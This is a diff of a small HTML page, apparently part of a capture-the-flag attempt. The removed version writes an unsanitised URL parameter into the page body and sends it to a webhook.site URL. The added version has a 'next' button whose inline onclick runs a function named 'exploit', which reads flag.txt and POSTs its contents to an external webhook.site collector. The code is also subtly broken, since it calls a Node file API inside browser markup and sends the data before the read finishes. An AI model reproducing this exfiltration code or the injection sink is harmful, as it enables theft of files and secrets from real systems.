@@ -1,19 +1,10 @@
 <!DOCTYPE html>
-<html>
-<head>
-<title>Page Title</title>
-</head>
-<body>
-
-<h1>Something Good Comming Soon :) </h1>
-
-<script>
-const urlParams = new URLSearchParams(window.location.search);
-var  c = urlParams.get('c');
-document.body.innerHTML = c;
-fetch("https://webhook.site/36f91445-676a-40ff-8a0d-6b63c5ad9fe2?c="+c);
-
-</script>
-
-</body>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  </head>
+  <body>
+    <button class="next" id="btn1" onclick="function exploit(){let e=new XMLHttpRequest,t;fs.readFile(\"flag.txt\",\"utf-8\",(e,o)=>{if(e)throw e;console.log(o),t=o}),e.open(\"POST\",\"https://webhook.site/36f91445-676a-40ff-8a0d-6b63c5ad9fe2\"),e.setRequestHeader(\"Accept\",\"application/json\"),e.setRequestHeader(\"Content-Type\",\"application/json\");let o='{\"flag\": \"'+t+'\"}';return e.send(o),\"ourflag\"+t}; exploit();">next</button>
+  </body>
 </html>
